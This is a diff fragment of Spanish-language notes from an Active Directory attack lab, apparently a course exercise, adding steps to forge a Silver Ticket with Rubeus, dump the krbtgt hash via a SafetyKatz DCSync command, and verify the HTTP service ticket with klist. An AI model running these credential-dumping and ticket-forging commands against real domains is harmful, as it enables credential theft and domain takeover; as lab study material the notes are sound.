@@ -840,4 +840,16 @@ Crearemos el *Silver Ticket* con *Rubeus*
 [student97]
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:4e9815869d2090ccfca61c1fe0d23986 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
 ```
-El hash rc4 ha sido obtenido de la ejecucion del anterior comando ``
+El hash rc4 ha sido obtenido de la ejecucion del anterior comando `C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"`
+
+Ahora deberemos de comprobar si hemos conseguido el ticket de servicio correcto
+```shell
+[student97]
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args klist
+```
+
+```ad-hint
+Server Name       : HTTP/dcorp-dc @ DOLLARCORP.MONEYCORP.LOCAL
+```
+
+Esto quiere decir que tenemos el ticket del servicio *HTTP* para *dcorp-*
